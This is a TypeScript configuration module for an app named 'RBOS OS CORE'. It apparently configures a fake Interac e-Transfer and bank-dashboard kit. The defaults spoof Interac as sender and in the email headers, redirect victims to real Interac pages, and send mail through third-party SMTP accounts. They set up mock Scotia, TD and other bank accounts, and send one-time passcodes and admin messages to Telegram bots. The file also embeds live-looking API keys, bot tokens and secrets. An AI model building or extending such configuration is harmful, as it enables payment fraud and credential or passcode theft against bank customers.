
export interface SystemConfig {
  general: {
    sender_name: string;
    sendername: string;
    app_name: string;
    app_url: string;
    base_path: string;
    timezone: string;
    debug_mode: boolean;
    admin_user: string;
    admin_pass_hash: string;
    admin_email: string;
    session_timeout_sec: number;
    csrf_token_length: number;
    cookie_secure: boolean;
    cookie_httponly: boolean;
    cookie_samesite: string;
    rate_limit_enabled: boolean;
    rate_limit_per_ip_per_min: number;
    encryption_key: string;
    gemini_api_key: string;
  };
  scotia_config: {
    username: string;
    password: string;
    account_holder: string;
    address: string;
    employment: {
        employer: string;
        job_title: string;
        annual_income: number;
    };
    accounts: { name: string, type: 'banking' | 'credit', balance: number, number?: string }[];
  };
  td_config: {
    username: string;
    password: string;
    account_holder: string;
    autodeposit_enabled: boolean;
    accounts: { name: string, type: 'banking' | 'credit', balance: number, number?: string }[];
  };
  bmo_config: { accounts: { name: string, type: 'banking' | 'credit', balance: number, number?: string }[] };
  cibc_config: { accounts: { name: string, type: 'banking' | 'credit', balance: number, number?: string }[] };
  servus_config: { accounts: { name: string, type: 'banking' | 'credit', balance: number, number?: string }[] };
  email_relay_config: {
    strategy: string;
    php_enabled: boolean;
    python_enabled: boolean;
    nodemailer_enabled: boolean;
  };
  modes: {
    hacker_mode: boolean;
    god_mode: boolean;
    developer_mode: boolean;
    experimental_ui: boolean;
  };
  contact: {
    support_email: string;
    reply_to_email: string;
    reply_to_name: string;
    bounce_email: string;
    unsubscribe: string;
    unsubscribe_email: string;
    physical_address: string;
    organization: string;
    feedback_id: string;
  };
  smtp: {
    host: string;
    port: number;
    username: string;
    password: string;
    from_email: string;
    encryption: string;
    from_name: string;
  };
  smtp1: {
    host: string;
    port: number;
    username: string;
    password: string;
    from_email: string;
    encryption: string;
    from_name: string;
  };
  dkim: {
    domain: string;
    selector: string;
    private_key: string;
    passphrase: string;
  };
  telegram: {
    enabled: boolean;
    bot_token: string;
    chat_id: string;
  };
  otp: {
    enabled: boolean;
    bot_token: string;
    chat_id: string;
  };
  ADMIN: {
    enabled: boolean;
    bot_token: string;
    chat_id: string;
  };
  email_deliverability: {
    max_attempts: number;
    retry_delay: number;
    hard_bounce_ttl: number;
    soft_bounce_ttl: number;
    disposable_domains: string[];
  };
  features: {
    ledger_enabled: boolean;
    csv_legacy_enabled: boolean;
    rollback_on_send_fail: boolean;
    idempotency_enabled: boolean;
    status_redirect_enabled: boolean;
    expiry_enforced: boolean;
    rate_limiting_enabled: boolean;
    suppression_list_enabled: boolean;
    dkim_signing_enabled: boolean;
    bounce_handling_enabled: boolean;
    gemini_key_rotation_status: string;
  };
  transfer_settings: {
    transfer_expiry_days: number;
    transfer_token_ttl_sec: number;
    allow_overdraft: boolean;
    max_amount: number;
    min_amount: number;
    transaction_id_length: number;
    default_importance: string;
    smtp_timeout: number;
    smtp_timeout_sec: number;
    file_lock_timeout: number;
    current_smtp: string;
    transfer_statuses: string[];
    final_statuses: string[];
    transfer_redirects: Record<string, string>;
  };
  ui: {
    primary_color: string;
    accent_color: string;
    header_color: string;
  };
  pages: string[];
  theme: {
    primary: string;
    accent: string;
    secondary: string;
    text: string;
    radius: number;
    glass: number;
    icon: string;
  };
  email_headers: Record<string, string>;
  paths: Record<string, string>;
  network_internet: {
    wifi_enabled: boolean;
    mobile_data_enabled: boolean;
    hotspot_enabled: boolean;
    airplane_mode: boolean;
    vpn_enabled: boolean;
    data_saver_enabled: boolean;
    data_usage_gb: number;
    preferred_network_type: string;
    private_dns_mode: string;
  };
  connected_devices: {
    bluetooth_enabled: boolean;
    nfc_enabled: boolean;
    cast_enabled: boolean;
    usb_mode: string;
    paired_devices: string[];
    nearby_share_enabled: boolean;
  };
  display_options: {
    dark_mode: boolean;
    adaptive_brightness: boolean;
    screen_timeout_sec: number;
    font_size: string;
    wallpaper_url: string;
    refresh_rate_hz: number;
    night_light_enabled: boolean;
    screen_saver_enabled: boolean;
    color_mode: string;
  };
  sound_vibration: {
    media_volume: number;
    notification_volume: number;
    ring_volume: number;
    alarm_volume: number;
    vibration_enabled: boolean;
    do_not_disturb_enabled: boolean;
    haptic_feedback_enabled: boolean;
    ringtone: string;
    notification_sound: string;
  };
  storage_settings: {
    total_space_gb: number;
    used_space_gb: number;
    smart_storage_enabled: boolean;
    temporary_files_gb: number;
    system_files_gb: number;
    app_data_gb: number;
    photos_videos_gb: number;
  };
  privacy_security: {
    camera_access: boolean;
    microphone_access: boolean;
    location_access: boolean;
    ad_id_reset_enabled: boolean;
    google_location_accuracy: boolean;
    app_permissions_manager: boolean;
    find_my_device_enabled: boolean;
    screen_lock_type: string;
    fingerprint_enabled: boolean;
    face_unlock_enabled: boolean;
    token_lock_enabled: boolean;
    last_security_check: string;
    security_updates_auto: boolean;
  };
  accounts_google: {
    google_account: string;
    auto_sync_data: boolean;
    backup_enabled: boolean;
    device_name: string;
    personal_safety_enabled: boolean;
  };
  accessibility_wellbeing: {
    talkback_enabled: boolean;
    magnification_enabled: boolean;
    color_correction_enabled: boolean;
    focus_mode_enabled: boolean;
    app_timers_enabled: boolean;
    bedtime_mode_enabled: boolean;
    grayscale_enabled: boolean;
  };
  system_preferences: {
    language: string;
    gestures_enabled: boolean;
    system_navigation: string;
    date_time_auto: boolean;
    time_format_24hr: boolean;
    system_updates_auto: boolean;
    last_update_check: string;
    reset_options_available: boolean;
  };
  about_phone: {
    model_name: string;
    android_version: string;
    build_number: string;
    serial_number: string;
    uptime_days: number;
    kernel_version: string;
    baseband_version: string;
  };
  email_settings: {
    default_format: string;
    html_template_name: string;
  };
}

const STORAGE_KEY = 'rbos_system_config_v5';

const DEFAULT_CONFIG: SystemConfig = {
  general: {
    sender_name: 'JENNIFER EDWARDS',
    sendername: 'JENNIFER EDWARDS',
    app_name: 'RBOS OS CORE',
    app_url: 'http://localhost:3002',
    base_path: '',
    timezone: 'America/Edmonton',
    debug_mode: false,
    admin_user: 'admin',
    admin_pass_hash: '$2y$12$oRWlUGLZq81yYgZYjJs5u.9yycvypFh1qzj9HCctOJDFrRIIcOybW',
    admin_email: 'admin@rbos.net',
    session_timeout_sec: 900,
    csrf_token_length: 32,
    cookie_secure: true,
    cookie_httponly: true,
    cookie_samesite: 'Lax',
    rate_limit_enabled: true,
    rate_limit_per_ip_per_min: 60,
    encryption_key: 'a3f91b6cd024e8c29b76a149efcc5d42',
    gemini_api_key: 'AIzaSyDXAD-SoyiDl4PI4a6-fTL91GdUqT-zRY4',
  },
  scotia_config: {
    username: 'jennifer.edwards',
    password: 'password123',
    account_holder: 'JENNIFER EDWARDS',
    address: '123 Jasper Ave, Edmonton AB T5J 2Z1',
    employment: {
        employer: 'ALBERTA HEALTH SERVICES',
        job_title: 'Analyst',
        annual_income: 85000
    },
    accounts: [
        { name: 'Basic Plus', type: 'banking', balance: 12482.05, number: '•••• 1029' },
        { name: 'Momentum PLUS', type: 'banking', balance: 24293.03, number: '•••• 3847' },
        { name: 'Momentum Savings', type: 'banking', balance: 5137.16, number: '•••• 9283' },
        { name: 'Scotiabank Gold Amex Card', type: 'credit', balance: 1455.00, number: '•••• 4412' },
        { name: 'Scotiabank Passport Visa Infinite card', type: 'credit', balance: 2769.49, number: '•••• 8839' }
    ]
  },
  td_config: {
    username: 'albertafarms',
    password: 'password123',
    account_holder: 'JENNIFER EDWARDS',
    autodeposit_enabled: true,
    accounts: [
        { name: 'TD EveryDay Chequing', type: 'banking', balance: 10153.10, number: '•••• 1035' },
        { name: 'TD EveryDay Savings', type: 'banking', balance: 3153.10, number: '•••• 5521' },
        { name: 'TD First Class Travel Visa Infinite* Card', type: 'credit', balance: 926.84, number: '•••• 2938' }
    ]
  },
  bmo_config: { accounts: [{ name: 'Lead Ledger', type: 'banking', balance: 8240.00, number: '•••• 8271' }] },
  cibc_config: { accounts: [{ name: 'Neural Vault', type: 'banking', balance: 12400.00, number: '•••• 4482' }] },
  servus_config: { accounts: [{ name: 'Servus Share', type: 'banking', balance: 5400.00, number: '•••• 1029' }] },
  email_relay_config: {
    strategy: 'failover',
    php_enabled: true,
    python_enabled: true,
    nodemailer_enabled: false
  },
  modes: {
    hacker_mode: false,
    god_mode: false,
    developer_mode: false,
    experimental_ui: false,
  },
  contact: {
    support_email: 'support@rbos.net',
    reply_to_email: 'notify@payments.interac.ca',
    reply_to_name: 'Interac e-Transfer',
    bounce_email: 'bounces@rbos.net',
    unsubscribe: '',
    unsubscribe_email: 'unsubscribe@rbos.net',
    physical_address: 'Neural Heights, Cloud City',
    organization: 'Neural Systems Corp',
    feedback_id: 'rbos-feedback-2024',
  },
  smtp: {
    host: 'smtp.office365.com',
    port: 587,
    username: 'accounting@abfarms.ca',
    password: '',
    from_email: 'accounting@abfarms.ca',
    encryption: 'tls',
    from_name: 'SARAH-CORE System (Primary)',
  },
  smtp1: {
    host: 'mail.shaw.ca',
    port: 587,
    username: 'Helpdesk.888@shaw.ca',
    password: '',
    from_email: 'Helpdesk.888@shaw.ca',
    encryption: 'tls',
    from_name: 'SARAH-CORE System (Failover)',
  },
  dkim: {
    domain: 'abfarms.ca',
    selector: 'selector1',
    private_key: './config/dkim/private.key',
    passphrase: '',
  },
  telegram: {
    enabled: true,
    bot_token: '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM',
    chat_id: '-1002922644009',
  },
  otp: {
    enabled: true,
    bot_token: '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM',
    chat_id: '-1003169150482',
  },
  ADMIN: {
    enabled: true,
    bot_token: '8480568636:AAHc8uTzNaWSSJTLeMJ38BhzMzyjB8Wgo4A',
    chat_id: '-1002922644009',
  },
  email_deliverability: {
    max_attempts: 3,
    retry_delay: 5,
    hard_bounce_ttl: 2592000,
    soft_bounce_ttl: 86400,
    disposable_domains: [
      'tempmail.com', 'guerrillamail.com', '10minutemail.com', 'mailinator.com',
      'temp-mail.org', 'throwawaymail.com',
    ],
  },
  features: {
    ledger_enabled: true,
    csv_legacy_enabled: true,
    rollback_on_send_fail: true,
    idempotency_enabled: true,
    status_redirect_enabled: true,
    expiry_enforced: true,
    rate_limiting_enabled: true,
    suppression_list_enabled: true,
    dkim_signing_enabled: true,
    bounce_handling_enabled: true,
    gemini_key_rotation_status: 'idle',
  },
  transfer_settings: {
    transfer_expiry_days: 30,
    transfer_token_ttl_sec: 2592000,
    allow_overdraft: false,
    max_amount: 10000.0,
    min_amount: 0.01,
    transaction_id_length: 8,
    default_importance: 'normal',
    smtp_timeout: 30,
    smtp_timeout_sec: 25,
    file_lock_timeout: 10,
    current_smtp: 'smtp',
    transfer_statuses: ['reserved', 'pending', 'completed', 'cancelled', 'declined', 'failed', 'rolled_back'],
    final_statuses: ['completed', 'cancelled', 'declined', 'expired'],
    transfer_redirects: {
      completed: 'https://etransfer.interac.ca/deposited',
      cancelled: 'https://etransfer.interac.ca/cancelled',
      declined: 'https://etransfer.interac.ca/cancelled',
      failed: 'https://etransfer.interac.ca/error',
      expired: 'https://etransfer.interac.ca/expired',
    },
  },
  ui: {
    primary_color: '#ffcc00',
    accent_color: '#4a3f2e',
    header_color: '#4a3f2e',
  },
  pages: ['home', 'accounts', 'payments', 'etransfer', 'cards', 'rewards', 'profile'],
  theme: {
    primary: '#005eb8',
    accent: '#00b5e2',
    secondary: '#003f7d',
    text: '#ffffff',
    radius: 15,
    glass: 0.75,
    icon: 'assets/app_icon.jpg',
  },
  email_headers: {
    'X-Entity-Ref': 'transaction_id', 'X-Priority': '3 (Normal)', 'Precedence': 'bulk',
    'X-Account-Id': 'interac-etransfer', 'X-System': 'interac-notification',
    'X-Email-Type': 'Transactional', 'X-Bounce-Key': 'hashed_identifier',
    'X-Report-Abuse': 'abuse@abfarms.ca', 'X-Template-Version': '2024.1',
    'X-Campaign-ID': 'interac-etransfer-notification', 'X-Rate-Limit': '1/3600',
    'List-Help': 'support@abfarms.ca',
  },
  paths: {
    'template_root': './templates', 'email_template': 'Deposit.html',
    'accounts_file': './data/accounts.json', 'log_file': './data/logs/transactions.log',
    'suppression_list_file': './data/suppression_list.json', 'bounce_log_file': './data/logs/bounces.log',
    'deliverability_log_file': './data/logs/deliverability.log',
    'rate_limit_path': './data/logs/rate_limits/', 'pending_file': './data/pending.csv',
    'contacts_file': './data/contacts.csv', 'transactions_file': './data/transactions.log',
    'transfers_file': './data/transfers.csv', 'money_lock_file': './data/money.lock',
    'transfers_ledger_jsonl': './data/transfers.jsonl',
    'transfers_ledger_index': './data/transfers_index.json',
  },
  network_internet: {
    wifi_enabled: true, 'mobile_data_enabled': true, 'hotspot_enabled': false,
    'airplane_mode': false, 'vpn_enabled': false, 'data_saver_enabled': false,
    'data_usage_gb': 12.7, 'preferred_network_type': '5G', 'private_dns_mode': 'automatic',
  },
  connected_devices: {
    'bluetooth_enabled': true, 'nfc_enabled': true, 'cast_enabled': true,
    'usb_mode': 'file_transfer', 'paired_devices': ['NeuralLink-v2.1', 'SARAH-Watch Pro'],
    'nearby_share_enabled': true,
  },
  display_options: {
    'dark_mode': true, 'adaptive_brightness': true, 'screen_timeout_sec': 30,
    'font_size': 'default', 'wallpaper_url': 'https://images.unsplash.com/photo-1511447333015-45dc2388e630?q=80&w=2000&auto=format&fit=crop',
    'refresh_rate_hz': 90, 'night_light_enabled': false, 'screen_saver_enabled': false,
    'color_mode': 'adaptive',
  },
  sound_vibration: {
    'media_volume': 75, 'notification_volume': 60, 'ring_volume': 80, 'alarm_volume': 70,
    'vibration_enabled': true, 'do_not_disturb_enabled': false, 'haptic_feedback_enabled': true,
    'ringtone': 'Default', 'notification_sound': 'Default',
  },
  storage_settings: {
    'total_space_gb': 256, 'used_space_gb': 64.5, 'smart_storage_enabled': true,
    'temporary_files_gb': 2.1, 'system_files_gb': 15.0, 'app_data_gb': 25.3,
    'photos_videos_gb': 18.0,
  },
  privacy_security: {
    'camera_access': true, 'microphone_access': true, 'location_access': true,
    'ad_id_reset_enabled': false, 'google_location_accuracy': true,
    'app_permissions_manager': true, 'find_my_device_enabled': true,
    'screen_lock_type': 'pin', 'fingerprint_enabled': true, 'face_unlock_enabled': false,
    'token_lock_enabled': false,
    'last_security_check': '2024-10-24', 'security_updates_auto': true,
  },
  accounts_google: {
    'google_account': 'sarah.core@neuralink.net', 'auto_sync_data': true,
    'backup_enabled': true, 'device_name': 'SARAH-CORE X-1', 'personal_safety_enabled': true,
  },
  accessibility_wellbeing: {
    'talkback_enabled': false, 'magnification_enabled': false,
    'color_correction_enabled': false, 'focus_mode_enabled': false,
    'app_timers_enabled': true, 'bedtime_mode_enabled': false, 'grayscale_enabled': false,
  },
  system_preferences: {
    'language': 'English (United States)', 'gestures_enabled': true,
    'system_navigation': 'gestures', 'date_time_auto': true, 'time_format_24hr': false,
    'system_updates_auto': true, 'last_update_check': '2024-10-24 10:30',
    'reset_options_available': true,
  },
  about_phone: {
    'model_name': 'SARAH-CORE X-1', 'android_version': '16.0.0 (NeuralBuild)',
    'build_number': 'SPB5.210812.002.A1', 'serial_number': 'AB12CD34EF56GH78',
    'uptime_days': 12, 'kernel_version': '5.10.0-1054-neural', 'baseband_version': 'G988BXXU1DUA2',
  },
  email_settings: {
    'default_format': 'html', 'html_template_name': 'InteracNotice.html',
  },
};

export function getSystemConfig(): SystemConfig {
  const saved = localStorage.getItem(STORAGE_KEY);
  if (saved) {
    try {
      const parsed = JSON.parse(saved);
      return { 
        ...DEFAULT_CONFIG, 
        ...parsed,
        general: { ...DEFAULT_CONFIG.general, ...parsed.general },
        scotia_config: { ...DEFAULT_CONFIG.scotia_config, ...parsed.scotia_config },
        td_config: { ...DEFAULT_CONFIG.td_config, ...parsed.td_config },
        display_options: { ...DEFAULT_CONFIG.display_options, ...parsed.display_options },
        sound_vibration: { ...DEFAULT_CONFIG.sound_vibration, ...parsed.sound_vibration },
        about_phone: { ...DEFAULT_CONFIG.about_phone, ...parsed.about_phone },
        privacy_security: { ...DEFAULT_CONFIG.privacy_security, ...parsed.privacy_security },
        email_relay_config: { ...DEFAULT_CONFIG.email_relay_config, ...parsed.email_relay_config },
      };
    } catch (e) {
      return DEFAULT_CONFIG;
    }
  }
  return DEFAULT_CONFIG;
}

export function saveSystemConfig(config: SystemConfig) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(config));
  window.dispatchEvent(new CustomEvent('system_config_updated', { detail: config }));
}
